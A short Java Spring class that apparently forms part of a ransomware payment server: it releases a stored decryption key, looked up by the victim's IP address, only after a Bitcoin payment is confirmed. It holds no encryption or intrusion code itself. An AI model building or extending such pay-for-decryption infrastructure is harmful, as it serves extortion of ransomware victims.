package app.bl;

import java.util.Optional;

import javax.inject.Inject;

import org.springframework.beans.factory.annotation.Autowired;

import app.entities.Bitcoin;
import app.entities.CryptoKey;
import app.exceptions.KeyNotFoundException;
import app.exceptions.PaymentNotFoundException;
import app.repositories.KeyRepository;

public class DecryptionLogic {

	@Autowired
	private KeyRepository repository;
	@Inject
	PaymentProcess clientPayment;

	public CryptoKey getKey(String ip, Bitcoin btc) throws PaymentNotFoundException, KeyNotFoundException {
		if (clientPayment.isPaid()) {
			Optional<CryptoKey> key = repository.findById(ip);
			if (key.isPresent()) {
				return key.get();
			} else {
				throw new KeyNotFoundException();
			}
		}
		throw new PaymentNotFoundException();
	}
}
